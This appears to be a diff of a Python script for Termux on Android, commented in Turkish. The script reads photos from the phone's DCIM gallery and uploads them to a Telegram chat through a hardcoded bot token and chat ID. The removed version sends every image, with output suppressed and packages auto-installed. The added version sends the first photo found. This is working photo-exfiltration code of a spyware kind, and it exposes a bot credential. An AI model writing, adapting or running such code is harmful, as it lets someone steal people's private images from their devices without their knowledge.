@@ -1,68 +1,41 @@
 import os
-import subprocess
 import requests
-from tqdm import tqdm  # İlerleme çubuğu için
+import json
+import time
 
-# Telegram Bot Token ve Chat ID
-BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
+# Telegram Bilgileri
+TELEGRAM_BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
 CHAT_ID = "7561737990"
 
-# Denenecek klasör yolları
-DCIM_PATHS = [
-    "/storage/emulated/0/DCIM/",
-    "/sdcard/DCIM/",
-    "/data/data/com.termux/files/home/storage/dcim/"
-]
-
-# Desteklenen resim formatları
-IMAGE_EXTENSIONS = (".png", ".jpg", ".jpeg")
-
-# Eksik modülleri kontrol et ve yükle
-def install_missing_packages():
-    required_packages = ["requests", "tqdm"]
-    for package in required_packages:
-        try:
-            __import__(package)
-        except ImportError:
-            subprocess.run(["pip", "install", package], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    # Termux'un depolama erişimi için izin ver
-    subprocess.run(["termux-setup-storage"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-# İlk erişilebilen klasörü bul
-def find_accessible_folder():
-    for path in DCIM_PATHS:
-        if os.path.exists(path) and os.access(path, os.R_OK):
-            return path
-    return None  # Hiçbirine erişim yoksa
-
-# Resim dosyasını Telegram botuna gönderme fonksiyonu
-def send_photo(image_path):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    with open(image_path, "rb") as img:
-        files = {"photo": img}
+def send_telegram_photo(photo_path):
+    """Belirtilen fotoğrafı Telegram'a gönderir."""
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+    with open(photo_path, "rb") as photo:
+        files = {"photo": photo}
         data = {"chat_id": CHAT_ID}
-        response = requests.post(url, files=files, data=data)
-    return response.json()
+        try:
+            response = requests.post(url, files=files, data=data)
+            print(response.json())
+        except Exception as e:
+            print(f"Fotoğraf gönderme hatası: {e}")
 
-def main():
-    install_missing_packages()
+# Termux depolama erişimi için izin al
+os.system("termux-setup-storage")
+time.sleep(2)  # İzin işlemi için bekleme süresi
 
-    dcim_folder = find_accessible_folder()
-    if not dcim_folder:
-        return  # Hiçbir klasöre erişilemiyorsa çık
+# Termux ile galerideki fotoğrafları listele
+os.system("find /storage/emulated/0/DCIM/ -type f | head -n 1 > first_photo.txt")
 
-    images = [f for f in os.listdir(dcim_folder) if f.lower().endswith(IMAGE_EXTENSIONS)]
-    if not images:
-        return  # Gönderilecek resim yoksa çık
+# İlk fotoğrafın yolunu al
+try:
+    with open("first_photo.txt", "r") as f:
+        first_photo = f.readline().strip()
 
-    progress_bar = tqdm(total=len(images), desc="📤 Resimler Gönderiliyor", unit="resim", ncols=80, ascii=True)
+        if first_photo:
+            # Fotoğrafı Telegram'a gönder
+            send_telegram_photo(first_photo)
+        else:
+            print("Galeri boş veya fotoğraf bulunamadı.")
 
-    for image in images:
-        image_path = os.path.join(dcim_folder, image)
-        send_photo(image_path)
-        progress_bar.update(1)  # İlerleme çubuğunu bir adım ilerlet
-    
-    progress_bar.close()
-
-if __name__ == "__main__":
-    main()
+except Exception as e:
+    print(f"Fotoğraf bulunamadı veya hata oluştu: {e}")
